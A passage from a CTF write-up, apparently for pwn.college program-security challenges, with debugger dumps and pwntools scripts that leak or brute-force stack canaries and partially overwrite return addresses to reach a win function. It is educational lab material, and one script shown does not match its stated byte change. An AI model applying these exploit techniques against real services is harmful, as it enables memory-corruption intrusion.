+- [ ] Expected substring in order to loop the `challenge()` function
+- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`
+
+Let's dump the stack pointed to by `rsi`.
+
+```
+pwndbg> x/50gx $rsi
+0x7ffc645e7d90: 0x0000000000000000      0x0000000000000000
+0x7ffc645e7da0: 0x0000000000000000      0x0000000000000000
+0x7ffc645e7db0: 0x0000000000000000      0x000074d581520193
+0x7ffc645e7dc0: 0x000000006ffffdff      0xd9065db93471fb00
+0x7ffc645e7dd0: 0x000074d581503000      0x000056877356d140
+0x7ffc645e7de0: 0x000056877356c200      0x00007ffc645e9010
+0x7ffc645e7df0: 0x0000000000000000      0x0000000000000000
+0x7ffc645e7e00: 0x00007ffc645e8f20      0x000074d581372d3f
+0x7ffc645e7e10: 0x0000003000000010      0x00007ffc645e7ef0
+0x7ffc645e7e20: 0x00007ffc645e7e30      0x000074d58139fe8d
+0x7ffc645e7e30: 0x00000000001be6a0      0x000074d5814fe6a0
+0x7ffc645e7e40: 0x0000000000000001      0x000074d5814fe723
+0x7ffc645e7e50: 0x0000000000000d68      0x000074d5813a1951
+0x7ffc645e7e60: 0x0000000000000d68      0x000000000000000a
+0x7ffc645e7e70: 0x000074d5814fe6a0      0x0000568773570020
+0x7ffc645e7e80: 0x000074d581504540      0x0000000000000000
+0x7ffc645e7e90: 0x0000000000000000      0x000074d5813a1e93
+0x7ffc645e7ea0: 0x000074d5814fe6a0      0x000000000000000a
+0x7ffc645e7eb0: 0x0000568773570020      0x000074d581397302
+0x7ffc645e7ec0: 0x000056877356d140      0x000056877356d140
+0x7ffc645e7ed0: 0x00007ffc645e8f20      0xd9065db93471fb00
+0x7ffc645e7ee0: 0x00007ffc645e8f20      0x000056877356d110
+0x7ffc645e7ef0: 0x0000000000001000      0x00007ffc645e9028
+0x7ffc645e7f00: 0x00007ffc645e9018      0x00000001001e8788
+0x7ffc645e7f10: 0x00000000001e8788      0x0000000000005018
+```
+
+Since, we know that the location of return address to `main` is `0x7ffc645e7ed0`, we can find the canary of the current function 16 bytes before that.
+We can also see the canary of the previous function, which was leftover in the above stack dump.
+
+- [x] Location of buffer: `0x7ffc645e7d90`
+- [x] Location of canary of the current function: `0x7ffc645e7ed8`
+- [x] Location of the canary of the previously executed function: `0x7ffc645e7dc8`
+- [ ] Expected substring in order to loop the `challenge()` function
+- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`
+
+Finally, let's continue program execution and get the expected string that would call the `challenge()` function to call itself.
+
+```
+pwndbg> c
+Continuing.
+aa
+You said: aa
+
+Breakpoint 2, 0x000056877356cfde in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
+ RBX  0x56877356d140 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+*RDX  0
+*RDI  0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
+*RSI  0x56877356e17e ◂— 0x544145504552 /* 'REPEAT' */
+*R8   0xd
+*R9   0xd
+*R10  0x56877356e17c ◂— 0x544145504552000a /* '\n' */
+ R11  0x246
+ R12  0x56877356c200 (_start) ◂— endbr64 
+ R13  0x7ffc645e9010 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffc645e7ee0 —▸ 0x7ffc645e8f20 ◂— 0
+ RSP  0x7ffc645e7d50 ◂— 0
+*RIP  0x56877356cfde (challenge+276) ◂— call strstr@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x56877356cfde <challenge+276>    call   strstr@plt                  <strstr@plt>
+        haystack: 0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
+        needle: 0x56877356e17e ◂— 0x544145504552 /* 'REPEAT' */
+ 
+   0x56877356cfe3 <challenge+281>    test   rax, rax
+   0x56877356cfe6 <challenge+284>    je     challenge+330               <challenge+330>
+ 
+   0x56877356cfe8 <challenge+286>    lea    rdi, [rip + 0x1199]     RDI => 0x56877356e188 ◂— 'Backdoor triggered! Repeating challenge()'
+   0x56877356cfef <challenge+293>    call   puts@plt                    <puts@plt>
+ 
+   0x56877356cff4 <challenge+298>    mov    rdx, qword ptr [rbp - 0x188]
+   0x56877356cffb <challenge+305>    mov    rcx, qword ptr [rbp - 0x180]
+   0x56877356d002 <challenge+312>    mov    eax, dword ptr [rbp - 0x174]
+   0x56877356d008 <challenge+318>    mov    rsi, rcx
+   0x56877356d00b <challenge+321>    mov    edi, eax
+   0x56877356d00d <challenge+323>    call   challenge                   <challenge>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffc645e7d50 ◂— 0
+01:0008│-188 0x7ffc645e7d58 —▸ 0x7ffc645e9028 —▸ 0x7ffc645e969c ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-180 0x7ffc645e7d60 —▸ 0x7ffc645e9018 —▸ 0x7ffc645e9680 ◂— '/challenge/latent-leak-hard'
+03:0018│-178 0x7ffc645e7d68 ◂— 0x100000000
+04:0020│-170 0x7ffc645e7d70 ◂— 0
+05:0028│-168 0x7ffc645e7d78 ◂— 0x200000000
+06:0030│-160 0x7ffc645e7d80 ◂— 2
+07:0038│-158 0x7ffc645e7d88 —▸ 0x7ffc645e7d90 ◂— 0x6161 /* 'aa' */
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x56877356cfde challenge+276
+   1   0x56877356d110 main+213
+   2   0x74d581335083 __libc_start_main+243
+   3   0x56877356c22e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7ffc645e7d90`
+- [x] Location of canary of the current function: `0x7ffc645e7ed8`
+- [x] Location of the canary of the previously executed function: `0x7ffc645e7dc8`
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+- [x] Location of stored return address to `main()`: `0x7ffc645e7ee8`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# Initialize data
+buffer_addr = 0x7ffc645e7d90
+prev_func_canary_addr = 0x7ffc645e7dc8
+curr_func_canary_addr = 0x7ffc645e7ed8
+addr_of_saved_ip = 0x7ffc645e7ee8
+safe_win_auth_offset = 0x1dc9
+
+attempt = 0
+
+while True:
+    attempt += 1
+    p = process('/challenge/latent-leak-hard')
+    
+    try:
+        # Standard offsets for this challenge level
+        # If your previous leak was 24, try 24, but let's verify the output
+        offset_to_prev_func_canary = prev_func_canary_addr - buffer_addr               # Distance from start of buffer to the canary
+        payload_size = offset_to_prev_func_canary + 1
+
+        # --- STAGE 1: LEAK ---
+        p.recvuntil(b'Payload size: ')
+        p.sendline(str(payload_size).encode())
+
+        payload = b'REPEAT'
+        payload += b'A' * (offset_to_prev_func_canary - 6)
+        payload += b'B' 
+
+        p.recvuntil(b'bytes)!')
+        p.send(payload)
+
+        # Grab the leak
+        p.recvuntil(b'AAAAAB')
+        canary_raw = p.recv(7)
+        canary = u64(canary_raw.rjust(8, b'\x00'))
+
+        # --- STAGE 2: EXPLOIT ---
+        offset_to_prev_func_canary = curr_func_canary_addr - buffer_addr 
+        offset_to_ret = addr_of_saved_ip - (curr_func_canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 
+
+        p.recvuntil(b'Payload size: ')
+        
+        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
+        exploit = b"A" * offset_to_prev_func_canary
+        exploit += p64(canary)
+        exploit += b"B" * offset_to_ret
+        exploit += struct.pack("<H", safe_win_auth_offset)
+
+        p.sendline(str(len(exploit)).encode())
+        p.recvuntil(b'bytes)!')
+        p.send(exploit)
+
+        # Increase timeout slightly to allow the flag to print
+        output = p.recvall(timeout=1).decode(errors="ignore")
+        
+        if "pwn.college{" in output:
+            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
+            print(output)
+            break
+
+    except EOFError:
+        pass
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~latent-leak-hard:/$ python ~/script.py 
+!!! FLAG FOUND ON ATTEMPT 42 !!!
+
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Goodbye!
+You win! Here is your flag:
+pwn.college{w0w5Lz9440WBt2OeNSkABCeyLa6.0lNxMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Fork Foolery (Easy)
+
+```
+hacker@program-security~fork-foolery-easy:/$ /challenge/fork-foolery-easy 
+###
+### Welcome to /challenge/fork-foolery-easy!
+###
+
+This challenge is listening for connections on TCP port 1337.
+
+The challenge supports unlimited sequential connections.
+```
+
+Let's write a small script to senf `"Hello World"` to the challenge.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+
+context.log_level = 'info'
+
+# 1. Connect to the challenge
+p = remote(HOST, PORT)
+
+# 2. Wait for the size prompt
+p.recvuntil(b"Payload size: ")
+
+# 3. Tell the program we are sending 11 bytes ("Hello World")
+p.sendline(b"11")
+
+# 4. Wait for the confirmation message
+p.recvuntil(b"bytes)!")
+
+# 5. Send the actual string
+p.send(b"Hello World")
+
+# 6. Print the program's response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (2.57KB)
+[*] Closed connection to 127.0.0.1 port 1337
+
+You sent 11 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 0b 00 00 00 | 0x0000000ba7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 0b 00 00 00 00 00 00 00 | 0x000000000000000b |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 48 65 6c 6c 6f 20 57 6f | 0x6f57206f6c6c6548 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 72 6c 64 00 00 00 00 00 | 0x0000000000646c72 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a780 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae938e.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb400.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+### Goodbye!
+```
+
+So, in this challenge, we have to brute-force the canary and partially over-write the return address.
+
+### Brute forcing the canary
+
+Let's overwrite the known `\x00` byte of the canary with a `\x00` to see the program's output.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+OFFSET_TO_CANARY = 72 
+
+context.log_level = 'info'
+
+# 1. Connect
+p = remote(HOST, PORT)
+
+# 2. Handle Size Prompt
+p.recvuntil(b"Payload size: ")
+# 72 bytes of padding + 1 byte for the canary null
+p.sendline(b"73")
+
+# 3. Send Payload
+p.recvuntil(b"bytes)!")
+# Payload: Padding followed by the first byte of the canary (\x00)
+payload = b"A" * OFFSET_TO_CANARY + b"\x00"
+p.send(payload)
+
+# 4. Print Response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (2.57KB)
+[*] Closed connection to 127.0.0.1 port 1337
+
+You sent 73 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 00 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb400 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae938e.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb400.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+### Goodbye!
+```
+
+Now, let's overwrite the `\x00` byte with a `\x01` byte.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Configuration
+HOST = '127.0.0.1'
+PORT = 1337
+OFFSET_TO_CANARY = 72 
+
+context.log_level = 'info'
+
+# 1. Connect
+p = remote(HOST, PORT)
+
+# 2. Handle Size Prompt
+p.recvuntil(b"Payload size: ")
+# 72 bytes of padding + 1 byte for the canary null
+p.sendline(b"73")
+
+# 3. Send Payload
+p.recvuntil(b"bytes)!")
+# Payload: Padding followed by the first byte of the canary (\x00)
+payload = b"A" * OFFSET_TO_CANARY + b"\x00"
+p.send(payload)
+
+# 4. Print Response
+print("\n--- RESPONSE ---")
+print(p.recvall(timeout=1).decode(errors='ignore'))
+
+p.close()
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[+] Opening connection to 127.0.0.1 on port 1337: Done
+
+--- RESPONSE ---
+[+] Receiving all data: Done (2.60KB)
+[*] Closed connection to 127.0.0.1 port 1337
+
+You sent 73 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 49 00 00 00 | 0x00000049a7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 49 00 00 00 00 00 00 00 | 0x0000000000000049 |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a780 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a788 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a790 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a798 (rsp+0x0088) | 01 b4 7c 97 45 d3 e0 2d | 0x2de0d345977cb401 |
+| 0x00007fff04f2a7a0 (rsp+0x0090) | f0 b7 f2 04 ff 7f 00 00 | 0x00007fff04f2b7f0 |
+| 0x00007fff04f2a7a8 (rsp+0x0098) | 8e 93 ae a7 a4 64 00 00 | 0x000064a4a7ae938e |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff04f2a750
+- the saved frame pointer (of main) is at 0x7fff04f2a7a0
+- the saved return address (previously to main) is at 0x7fff04f2a7a8
+- the saved return address is now pointing to 0x64a4a7ae938e.
+- the canary is stored at 0x7fff04f2a798.
+- the canary value is now 0x2de0d345977cb401.
+- the address of win_authed() is 0x64a4a7ae87b4.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+Goodbye!
+*** stack smashing detected ***: terminated
+```
+
+The string `stack smashing detected` will be our oracle whch tells us if our brute-forced byte is correct.
+
+As for the return address brute force, we already know how to do it. But first we need the offset of the instruction within `win_authed()` which skips the authentication.
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x00000000000011a0  __cxa_finalize@plt
+0x00000000000011b0  putchar@plt
+0x00000000000011c0  __errno_location@plt
+0x00000000000011d0  puts@plt
+0x00000000000011e0  setsockopt@plt
+0x00000000000011f0  write@plt
+0x0000000000001200  __stack_chk_fail@plt
+0x0000000000001210  htons@plt
+0x0000000000001220  dup2@plt
+0x0000000000001230  printf@plt
+0x0000000000001240  geteuid@plt
+0x0000000000001250  close@plt
+0x0000000000001260  read@plt
+0x0000000000001270  listen@plt
+0x0000000000001280  setvbuf@plt
+0x0000000000001290  bind@plt
+0x00000000000012a0  open@plt
+0x00000000000012b0  accept@plt
+0x00000000000012c0  __isoc99_scanf@plt
+0x00000000000012d0  exit@plt
+0x00000000000012e0  strerror@plt
+0x00000000000012f0  wait@plt
+0x0000000000001300  fork@plt
+0x0000000000001310  socket@plt
+0x0000000000001320  _start
+0x0000000000001350  deregister_tm_clones
+0x0000000000001380  register_tm_clones
+0x00000000000013c0  __do_global_dtors_aux
+0x0000000000001400  frame_dummy
+0x0000000000001409  DUMP_STACK
+0x000000000000160c  bin_padding
+0x00000000000017b4  win_authed
+0x00000000000018d1  challenge
+0x000000000000216e  main
+0x00000000000023c0  __libc_csu_init
+0x0000000000002430  __libc_csu_fini
+0x0000000000002438  _fini
+```
+
+#### `win()`
+
+```
+pwndbg> disass win_authed 
+Dump of assembler code for function win_authed:
+   0x00000000000017b4 <+0>:     endbr64
+   0x00000000000017b8 <+4>:     push   rbp
+   0x00000000000017b9 <+5>:     mov    rbp,rsp
+   0x00000000000017bc <+8>:     sub    rsp,0x10
+   0x00000000000017c0 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x00000000000017c3 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x00000000000017ca <+22>:    jne    0x18ce <win_authed+282>
+   0x00000000000017d0 <+28>:    lea    rdi,[rip+0x1919]        # 0x30f0
+
+# ---- snip ----
+
+   0x00000000000018ce <+282>:   nop
+   0x00000000000018cf <+283>:   leave
+   0x00000000000018d0 <+284>:   ret
+End of assembler dump.
+```
+
+We know the address of `win_authed()` is `0x64a4a7ae87b4`, so the same offset would be `0x87d0`.
+
+### Exploit
+
+```py title="~/script.py"
+from pwn import *
+import struct
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+host = '127.0.0.1'
+port = 1337
+offset_to_canary = 72
+# Target instruction in win_authed() that skips the 0x1337 check
+safe_win_authed_offset = 0x87d0 
+
+# --- STAGE 1: BRUTE FORCE CANARY ---
+known_canary = b'\x00'
+print("[*] Stage 1: Brute-forcing Canary byte-by-byte...")
+
+for i in range(7):
+    found_byte = False
+    for byte_guess in range(256):
+        try:
+            p = remote(host, port)
+            p.recvuntil(b"Payload size: ")
+            
+            current_guess = known_canary + p8(byte_guess)
+            p.sendline(str(offset_to_canary + len(current_guess)).encode())
+            
+            p.recvuntil(b"bytes)!")
+            p.send(b"A" * offset_to_canary + current_guess)
+            
+            output = p.recvall(timeout=0.4)
+            
+            # Oracle: Success if Goodbye is present AND no stack smashing error
+            if b"Goodbye!" in output and b"stack smashing detected" not in output:
+                known_canary += p8(byte_guess)
+                print(f"[+] Found byte {i+1}: {hex(byte_guess)} | Current: 0x{known_canary.hex()}")
+                found_byte = True
+                p.close()
+                break
+            p.close()
+        except EOFError:
+            pass
+
+    if not found_byte:
+        print(f"[!] Failed to leak canary at byte {i+1}.")
+        exit()
+
+leaked_canary_int = u64(known_canary)
+print(f"[*] FINAL LEAKED CANARY: {hex(leaked_canary_int)}")
+
+# --- STAGE 2: BRUTE FORCE RIP (ASLR) ---
+print(f"[*] Stage 2: Starting RIP brute force loop (Target: {hex(safe_win_authed_offset)})")
+attempt = 0
+
+while True:
+    attempt += 1
+    p = None
+    try:
+        p = remote(host, port, timeout=1)
+        p.recvuntil(b"Payload size: ")
+        
+        # 72 (buffer) + 8 (canary) + 8 (rbp) + 2 (partial rip) = 90
+        p.sendline(b"90")
+        p.recvuntil(b"bytes)!")
+        
+        # Build the payload using the canary we just leaked
+        payload = b"A" * offset_to_canary
+        payload += known_canary
+        payload += b"B" * 8
+        payload += struct.pack("<H", safe_win_authed_offset)
+        
+        p.send(payload)
+        
+        output = p.recvall(timeout=1).decode(errors='ignore')
+        
+        if "pwn.college{" in output:
+            print(f"\n[!] SUCCESS on attempt {attempt}!")
+            print(output)
+            break
+        
+        p.close()
+        if attempt % 10 == 0:
+            print(f"[*] RIP Attempt {attempt}...", end='\r')
+            
+    except Exception:
+        if p: p.close()
+        pass
+```
+
+```
+hacker@program-security~fork-foolery-easy:/$ python ~/script.py 
+[*] Stage 1: Brute-forcing Canary byte-by-byte...
+[+] Found byte 1: 0xb4 | Current: 0x00b4
+[+] Found byte 2: 0x7c | Current: 0x00b47c
+[+] Found byte 3: 0x97 | Current: 0x00b47c97
+[+] Found byte 4: 0x45 | Current: 0x00b47c9745
+[+] Found byte 5: 0xd3 | Current: 0x00b47c9745d3
+[+] Found byte 6: 0xe0 | Current: 0x00b47c9745d3e0
+[+] Found byte 7: 0x2d | Current: 0x00b47c9745d3e02d
+[*] FINAL LEAKED CANARY: 0x2de0d345977cb400
+[*] Stage 2: Starting RIP brute force loop (Target: 0x87d0)
+
+[!] SUCCESS on attempt 1!
+
+You sent 90 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff04f2a710 (rsp+0x0000) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
+| 0x00007fff04f2a718 (rsp+0x0008) | f8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8f8 |
+| 0x00007fff04f2a720 (rsp+0x0010) | e8 b8 f2 04 ff 7f 00 00 | 0x00007fff04f2b8e8 |
+| 0x00007fff04f2a728 (rsp+0x0018) | 0a 00 00 00 01 00 00 00 | 0x000000010000000a |
+| 0x00007fff04f2a730 (rsp+0x0020) | a0 b6 42 de 4c 76 00 00 | 0x0000764cde42b6a0 |
+| 0x00007fff04f2a738 (rsp+0x0028) | b8 ba ae a7 5a 00 00 00 | 0x0000005aa7aebab8 |
+| 0x00007fff04f2a740 (rsp+0x0030) | 5a 00 00 00 00 00 00 00 | 0x000000000000005a |
+| 0x00007fff04f2a748 (rsp+0x0038) | 50 a7 f2 04 ff 7f 00 00 | 0x00007fff04f2a750 |
+| 0x00007fff04f2a750 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a758 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a760 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a768 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a770 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff04f2a778 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
